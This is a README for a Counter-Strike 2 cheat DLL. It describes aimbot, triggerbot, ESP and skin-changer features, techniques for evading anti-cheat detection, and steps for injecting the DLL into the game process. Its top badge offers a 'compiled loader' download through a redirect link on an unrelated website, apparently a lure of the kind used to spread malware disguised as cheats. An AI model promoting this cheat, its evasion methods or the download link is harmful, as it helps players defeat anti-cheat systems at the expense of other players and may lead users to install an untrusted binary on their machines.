# Cs2-Hck

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Internal cheat for Counter-Strike 2 (x64), written in C++20. Injected as a DLL, renders an ImGui menu via DX11, and hooks `CCSGOInput::CreateMove` for silent aim.

> **Disclaimer**: This repo is intended for reverse engineering research and learning game internals. Using it on public / VAC-secured matchmaking servers violates the Steam Subscriber Agreement and may result in a permanent ban. Use only on offline servers or with bots, at your own risk.

## Features

- **Aimbot** — silent aim via `CreateMove` hook (MinHook + signature scan), FOV options (angle/screen), bone target, auto shoot, team check, visibility check
- **Triggerbot** — auto fire when crosshair is on an enemy, configurable delay, key toggle
- **Bhop** — auto jump based on `FL_ONGROUND` flag + forced jump button
- **ESP** — box (normal/corner), skeleton, health bar, name, distance, glow, bomb timer, spectator list, team check
- **Skin Changer** — all weapons + knives + gloves, paint kit, wear, seed, StatTrak
- **Bullet Tracer** — renders the real bullet path from the aim angle
- **ImGui Menu** — DX11 overlay, toggle with `INSERT`, unload with `END`

## Preview 

<img src="image1.png" alt="Preview 1" width="450">

<img src="Capture.PNG" alt="Preview 2" width="450">

## Extreme Injector Settings

<img src="image.png" alt="Settings" width="500">


## Anti-Detection Build

- DX11 `Present` / `ResizeBuffers` are hooked via **COM vtable pointer swap** (no inline patch / MinHook trampoline)
- No code patching on the game itself — features like thirdperson use `SafeWrite` only
- Console / `printf` is only active in `_DEBUG` builds
- Indirect memory R/W for sensitive addresses (viewangles, frame history)
- MinHook is only used for `CreateMove` (signature scan inside `client.dll`)

## Stack

| Component         | Version / Source                                              |
| ----------------- | ------------------------------------------------------------- |
| Toolset           | MSVC v143 (Visual Studio 2022)                                |
| C++ Standard      | C++20                                                         |
| Platform          | x64, Windows                                                  |
| UI                | [Dear ImGui](https://github.com/ocornut/imgui) (DX11 + Win32) |
| Hook lib          | [MinHook](https://github.com/TsudaKageyu/minhook)             |
| Image loader      | [stb_image](https://github.com/nothings/stb)                  |
| Offsets / SDK     | [cs2-dumper](https://github.com/a2x/cs2-dumper) build 14164 (2026-05-24) |

## Project Structure

```
Cs2-Hck/
|-- dllmain.cpp            # Entry point, MainThread, hook init/cleanup
|-- hooks.h                # DX11 vtable swap (Present, ResizeBuffers), WndProc
|-- vmt_hook.h             # Generic VMT hook helper
|-- aimbot.h               # CreateMove signature hook + silent aim
|-- triggerbot.h           # Crosshair entity check + auto fire
|-- bhop.h                 # FL_ONGROUND check + forced jump
|-- esp.h                  # World-to-screen ESP rendering
|-- bullet_tracer.h        # Real bullet path tracer
|-- skin_changer.h         # CEconItemAttribute + RegenerateWeaponSkins
|-- paint_kits.h           # Paint kit lookup table
|-- menu.h                 # ImGui menu tabs + state
|-- game.h                 # Memory R/W helpers, ViewMatrix, WorldToScreen
|-- offsets.h              # Cached offsets from cs2-dumper
|-- sdk/                   # Generated headers from cs2-dumper
|-- minhook-master/        # MinHook source
\-- imgui-master/          # Dear ImGui source
```

## Build

Requirements:

- Visual Studio 2022 with the **Desktop development with C++** workload
- Windows 10/11 SDK

Steps:

1. Clone the repo (vendored deps `imgui-master` and `minhook-master` are already in the tree).
2. Open `Cs2-Hck.sln` in Visual Studio 2022.
3. Pick the ` | x64` configuration (or `Debug | x64` if you need console logs).
4. Build → output at `x64//Cs2-Hck.dll`.

## Usage

1. Launch CS2 and load into a map (offline / with bots).
2. Inject `Cs2-Hck.dll` into the `cs2.exe` process using a manual map DLL injector (recommended) or a LoadLibrary injector for testing.
3. Press `INSERT` to toggle the menu.
4. Press `END` to cleanly unload the cheat (all hooks are reverted before the DLL is freed).

## Updating Offsets

Offsets are cached in `offsets.h` and SDK headers are generated from [cs2-dumper](https://github.com/a2x/cs2-dumper). When the game updates:

1. Re-run the latest `cs2-dumper`.
2. Replace `sdk/offsets.hpp` and `sdk/client_dll.hpp`.
3. Sync the constant values in `offsets.h` with the latest dumper output.
4. Rebuild.

Latest offsets build in this repo: **cs2-dumper 14164 (2026-05-24)**.

## Credits

- [a2x/cs2-dumper](https://github.com/a2x/cs2-dumper) — offset dumper
- [ocornut/imgui](https://github.com/ocornut/imgui) — UI framework
- [TsudaKageyu/minhook](https://github.com/TsudaKageyu/minhook) — function hooking
- [nothings/stb](https://github.com/nothings/stb) — image loader
- Skin changer pattern adapted from the public FemboyChanger project

## License

The code written in this repo is released for educational purposes. Third-party libraries (`imgui-master`, `minhook-master`, `stb_image.h`) remain under their own licenses — see `imgui-master/LICENSE.txt` and `minhook-master/LICENSE.txt`.
